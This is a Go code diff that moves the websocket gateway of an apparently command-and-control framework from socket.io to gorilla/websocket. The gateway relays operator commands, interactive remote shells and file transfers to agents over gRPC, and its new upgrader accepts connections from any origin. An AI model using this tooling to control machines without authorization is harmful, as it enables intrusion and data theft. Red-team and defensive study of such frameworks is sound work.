@@ -14,18 +14,19 @@ import (
 	"time"
 
 	pb "github.com/ardhptr21/c2-grpc/pb"
-	socketio "github.com/googollee/go-socket.io"
+	"github.com/gorilla/websocket"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 )
 
 type gateway struct {
 	grpcAddr string
+	upgrader websocket.Upgrader
 }
 
 type session struct {
 	id       string
-	socket   socketio.Conn
+	socket   *websocket.Conn
 	grpcAddr string
 
 	ctxMu   sync.RWMutex
@@ -36,17 +37,20 @@ type session struct {
 
 	emitMu sync.Mutex
 
-	stateMu         sync.RWMutex
-	conn            *grpc.ClientConn
-	operatorStream  pb.OperatorService_ConnectClient
-	historyClient   pb.HistoryServiceClient
-	shellStream     pb.ShellService_OperatorShellClient
-	fileStream      pb.FileService_OperatorTransferClient
-	operatorSendMu  sync.Mutex
-	shellSendMu     sync.Mutex
-	fileSendMu      sync.Mutex
-	connected       bool
-	reconnectReason string
+	stateMu        sync.RWMutex
+	conn           *grpc.ClientConn
+	operatorStream pb.OperatorService_ConnectClient
+	historyClient  pb.HistoryServiceClient
+	shellStream    pb.ShellService_OperatorShellClient
+	fileStream     pb.FileService_OperatorTransferClient
+	operatorSendMu sync.Mutex
+	shellSendMu    sync.Mutex
+	fileSendMu     sync.Mutex
+}
+
+type wsEnvelope struct {
+	Event   string          `json:"event"`
+	Payload json.RawMessage `json:"payload"`
 }
 
 type statusEvent struct {
@@ -142,7 +146,10 @@ type acceptedPayload struct {
 	Message    string `json:"message,omitempty"`
 }
 
-var transferCounter atomic.Uint64
+var (
+	transferCounter atomic.Uint64
+	sessionCounter  atomic.Uint64
+)
 
 func main() {
 	httpHost := flag.String("host", "0.0.0.0", "HTTP host interface for the websocket gateway")
@@ -157,19 +164,15 @@ func main() {
 		grpcAddr = strings.TrimSpace(*grpcAddrFlag)
 	}
 
-	sio := socketio.NewServer(nil)
-	gw := &gateway{grpcAddr: grpcAddr}
-	gw.registerHandlers(sio)
-
-	go func() {
-		if err := sio.Serve(); err != nil {
-			log.Fatalf("socket.io serve error: %v", err)
-		}
-	}()
-	defer sio.Close()
+	gw := &gateway{
+		grpcAddr: grpcAddr,
+		upgrader: websocket.Upgrader{
+			CheckOrigin: func(*http.Request) bool { return true },
+		},
+	}
 
 	mux := http.NewServeMux()
-	mux.Handle("/socket.io/", sio)
+	mux.HandleFunc("/ws", gw.handleWS)
 	mux.HandleFunc("/healthz", func(w http.ResponseWriter, _ *http.Request) {
 		w.Header().Set("Content-Type", "application/json")
 		_ = json.NewEncoder(w).Encode(map[string]any{
@@ -182,7 +185,7 @@ func main() {
 		w.Header().Set("Content-Type", "application/json")
 		_ = json.NewEncoder(w).Encode(map[string]any{
 			"name":        "c2-websocket gateway",
-			"socketPath":  "/socket.io/",
+			"socketPath":  "/ws",
 			"grpcServer":  grpcAddr,
 			"healthcheck": "/healthz",
 		})
@@ -196,167 +199,28 @@ func main() {
 	}
 }
 
-func (g *gateway) registerHandlers(sio *socketio.Server) {
-	sio.OnConnect("/", func(c socketio.Conn) error {
-		sess := newSession(c, g.grpcAddr)
-		c.SetContext(sess)
-		sess.emit("gateway:ready", map[string]any{
-			"socketId": c.ID(),
-			"server":   g.grpcAddr,
-		})
-		go sess.run()
-		return nil
+func (g *gateway) handleWS(w http.ResponseWriter, r *http.Request) {
+	conn, err := g.upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		log.Printf("[gateway] websocket upgrade error: %v", err)
+		return
+	}
+
+	sess := newSession(conn, g.grpcAddr)
+	sess.emit("gateway:ready", map[string]any{
+		"socketId": sess.id,
+		"server":   g.grpcAddr,
 	})
 
-	sio.OnEvent("/", "command:dispatch", func(c socketio.Conn, req commandDispatchRequest) {
-		sess := mustSession(c)
-		if err := sess.dispatchCommand(req); err != nil {
-			sess.emitError(err)
-			return
-		}
-		sess.emit("command:accepted", acceptedPayload{
-			Type:    "command",
-			AgentID: req.AgentID,
-			Message: "command forwarded to gRPC operator stream",
-		})
-	})
-
-	sio.OnEvent("/", "history:list", func(c socketio.Conn, req historyListRequest) {
-		sess := mustSession(c)
-		go sess.loadHistory(req)
-	})
-
-	sio.OnEvent("/", "shell:open", func(c socketio.Conn, req shellRequest) {
-		sess := mustSession(c)
-		req.Type = "open"
-		if err := sess.sendShell(req); err != nil {
-			sess.emitError(err)
-			return
-		}
-		sess.emit("shell:accepted", acceptedPayload{
-			Type:    "shell",
-			AgentID: req.AgentID,
-			Message: "shell open request forwarded",
-		})
-	})
-
-	sio.OnEvent("/", "shell:input", func(c socketio.Conn, req shellRequest) {
-		sess := mustSession(c)
-		req.Type = "input"
-		if err := sess.sendShell(req); err != nil {
-			sess.emitError(err)
-		}
-	})
-
-	sio.OnEvent("/", "shell:resize", func(c socketio.Conn, req shellRequest) {
-		sess := mustSession(c)
-		req.Type = "resize"
-		if err := sess.sendShell(req); err != nil {
-			sess.emitError(err)
-		}
-	})
-
-	sio.OnEvent("/", "shell:close", func(c socketio.Conn, req shellRequest) {
-		sess := mustSession(c)
-		req.Type = "close"
-		if err := sess.sendShell(req); err != nil {
-			sess.emitError(err)
-		}
-	})
-
-	sio.OnEvent("/", "file:list", func(c socketio.Conn, req fileRequest) {
-		sess := mustSession(c)
-		req.Type = "list"
-		req.TransferID = ensureTransferID(req.TransferID)
-		if err := sess.sendFile(req); err != nil {
-			sess.emitError(err)
-			return
-		}
-		sess.emit("file:accepted", acceptedPayload{
-			Type:       "list",
-			AgentID:    req.AgentID,
-			TransferID: req.TransferID,
-			Message:    "file list request forwarded",
-		})
-	})
-
-	sio.OnEvent("/", "file:download", func(c socketio.Conn, req fileRequest) {
-		sess := mustSession(c)
-		req.Type = "download"
-		req.TransferID = ensureTransferID(req.TransferID)
-		if err := sess.sendFile(req); err != nil {
-			sess.emitError(err)
-			return
-		}
-		sess.emit("file:accepted", acceptedPayload{
-			Type:       "download",
-			AgentID:    req.AgentID,
-			TransferID: req.TransferID,
-			Message:    "file download request forwarded",
-		})
-	})
-
-	sio.OnEvent("/", "file:upload:start", func(c socketio.Conn, req fileRequest) {
-		sess := mustSession(c)
-		req.Type = "upload_start"
-		req.TransferID = ensureTransferID(req.TransferID)
-		if err := sess.sendFile(req); err != nil {
-			sess.emitError(err)
-			return
-		}
-		sess.emit("file:accepted", acceptedPayload{
-			Type:       "upload_start",
-			AgentID:    req.AgentID,
-			TransferID: req.TransferID,
-			Message:    "file upload start forwarded",
-		})
-	})
-
-	sio.OnEvent("/", "file:upload:chunk", func(c socketio.Conn, req fileRequest) {
-		sess := mustSession(c)
-		req.Type = "upload_chunk"
-		if err := sess.sendFile(req); err != nil {
-			sess.emitError(err)
-		}
-	})
-
-	sio.OnEvent("/", "file:upload:end", func(c socketio.Conn, req fileRequest) {
-		sess := mustSession(c)
-		req.Type = "upload_end"
-		if err := sess.sendFile(req); err != nil {
-			sess.emitError(err)
-		}
-	})
-
-	sio.OnEvent("/", "file:cancel", func(c socketio.Conn, req fileRequest) {
-		sess := mustSession(c)
-		req.Type = "cancel"
-		if err := sess.sendFile(req); err != nil {
-			sess.emitError(err)
-		}
-	})
-
-	sio.OnError("/", func(c socketio.Conn, err error) {
-		if sess, ok := c.Context().(*session); ok && sess != nil {
-			sess.emitError(err)
-			return
-		}
-		log.Printf("[gateway] socket error for %s: %v", c.ID(), err)
-	})
-
-	sio.OnDisconnect("/", func(c socketio.Conn, reason string) {
-		if sess, ok := c.Context().(*session); ok && sess != nil {
-			sess.close(reason)
-		}
-		log.Printf("[gateway] socket disconnected %s: %s", c.ID(), reason)
-	})
+	go sess.run()
+	go sess.readLoop()
 }
 
-func newSession(c socketio.Conn, grpcAddr string) *session {
+func newSession(conn *websocket.Conn, grpcAddr string) *session {
 	ctx, cancel := context.WithCancel(context.Background())
 	return &session{
-		id:       c.ID(),
-		socket:   c,
+		id:       fmt.Sprintf("ws-%d", sessionCounter.Add(1)),
+		socket:   conn,
 		grpcAddr: grpcAddr,
 		ctx:      ctx,
 		cancel:   cancel,
@@ -364,9 +228,115 @@ func newSession(c socketio.Conn, grpcAddr string) *session {
 	}
 }
 
-func mustSession(c socketio.Conn) *session {
-	sess, _ := c.Context().(*session)
-	return sess
+func (s *session) readLoop() {
+	defer s.close("websocket closed")
+
+	for {
+		_, data, err := s.socket.ReadMessage()
+		if err != nil {
+			return
+		}
+
+		var envelope wsEnvelope
+		if err := json.Unmarshal(data, &envelope); err != nil {
+			s.emitError(fmt.Errorf("invalid websocket message: %w", err))
+			continue
+		}
+
+		if err := s.handleEnvelope(envelope); err != nil {
+			s.emitError(err)
+		}
+	}
+}
+
+func (s *session) handleEnvelope(envelope wsEnvelope) error {
+	switch envelope.Event {
+	case "command:dispatch":
+		var req commandDispatchRequest
+		if err := decodePayload(envelope.Payload, &req); err != nil {
+			return err
+		}
+		if err := s.dispatchCommand(req); err != nil {
+			return err
+		}
+		s.emit("command:accepted", acceptedPayload{
+			Type:    "command",
+			AgentID: req.AgentID,
+			Message: "command forwarded to gRPC operator stream",
+		})
+	case "history:list":
+		var req historyListRequest
+		if err := decodePayload(envelope.Payload, &req); err != nil {
+			return err
+		}
+		go s.loadHistory(req)
+	case "shell:open", "shell:input", "shell:resize", "shell:close":
+		var req shellRequest
+		if err := decodePayload(envelope.Payload, &req); err != nil {
+			return err
+		}
+		req.Type = strings.TrimPrefix(envelope.Event, "shell:")
+		if err := s.sendShell(req); err != nil {
+			return err
+		}
+		if req.Type == "open" {
+			s.emit("shell:accepted", acceptedPayload{
+				Type:    "shell",
+				AgentID: req.AgentID,
+				Message: "shell open request forwarded",
+			})
+		}
+	case "file:list", "file:download", "file:upload:start", "file:upload:chunk", "file:upload:end", "file:cancel":
+		var req fileRequest
+		if err := decodePayload(envelope.Payload, &req); err != nil {
+			return err
+		}
+		req.Type = mapFileEventToType(envelope.Event)
+		req.TransferID = ensureTransferID(req.TransferID)
+		if err := s.sendFile(req); err != nil {
+			return err
+		}
+		if req.Type == "list" || req.Type == "download" || req.Type == "upload_start" {
+			s.emit("file:accepted", acceptedPayload{
+				Type:       req.Type,
+				AgentID:    req.AgentID,
+				TransferID: req.TransferID,
+				Message:    "file request forwarded",
+			})
+		}
+	default:
+		return fmt.Errorf("unknown event: %s", envelope.Event)
+	}
+	return nil
+}
+
+func decodePayload(raw json.RawMessage, target any) error {
+	if len(raw) == 0 || string(raw) == "null" {
+		return fmt.Errorf("missing payload")
+	}
+	if err := json.Unmarshal(raw, target); err != nil {
+		return fmt.Errorf("invalid payload: %w", err)
+	}
+	return nil
+}
+
+func mapFileEventToType(event string) string {
+	switch event {
+	case "file:list":
+		return "list"
+	case "file:download":
+		return "download"
+	case "file:upload:start":
+		return "upload_start"
+	case "file:upload:chunk":
+		return "upload_chunk"
+	case "file:upload:end":
+		return "upload_end"
+	case "file:cancel":
+		return "cancel"
+	default:
+		return event
+	}
 }
 
 func (s *session) run() {
@@ -447,7 +417,6 @@ func (s *session) connectUpstream() error {
 	s.historyClient = historyClient
 	s.shellStream = shellStream
 	s.fileStream = fileStream
-	s.connected = true
 	s.stateMu.Unlock()
 	return nil
 }
@@ -513,7 +482,6 @@ func (s *session) resetUpstream() {
 	s.historyClient = nil
 	s.shellStream = nil
 	s.fileStream = nil
-	s.connected = false
 	s.stateMu.Unlock()
 
 	if operatorStream != nil {
@@ -649,14 +617,8 @@ func (s *session) sendFile(req fileRequest) error {
 	if strings.TrimSpace(req.TransferID) == "" {
 		return fmt.Errorf("transferId is required")
 	}
-	if req.Type == "upload_chunk" {
-		if strings.TrimSpace(req.TransferID) == "" {
-			return fmt.Errorf("transferId is required")
-		}
-	} else if req.Type != "cancel" {
-		if strings.TrimSpace(req.AgentID) == "" {
-			return fmt.Errorf("agentId is required")
-		}
+	if req.Type != "cancel" && req.Type != "upload_chunk" && strings.TrimSpace(req.AgentID) == "" {
+		return fmt.Errorf("agentId is required")
 	}
 
 	var data []byte
@@ -740,9 +702,20 @@ func (s *session) emitError(err error) {
 }
 
 func (s *session) emit(event string, payload any) {
+	frame, err := json.Marshal(map[string]any{
+		"event":   event,
+		"payload": payload,
+	})
+	if err != nil {
+		log.Printf("[gateway] marshal emit %s failed: %v", event, err)
+		return
+	}
+
 	s.emitMu.Lock()
 	defer s.emitMu.Unlock()
-	s.socket.Emit(event, payload)
+	if err := s.socket.WriteMessage(websocket.TextMessage, frame); err != nil {
+		log.Printf("[gateway] emit %s to %s failed: %v", event, s.id, err)
+	}
 }
 
 func (s *session) close(reason string) {
@@ -757,6 +730,7 @@ func (s *session) close(reason string) {
 
 	s.cancel()
 	s.resetUpstream()
+	_ = s.socket.Close()
 	if reason != "" {
 		log.Printf("[gateway] session %s closed: %s", s.id, reason)
 	}
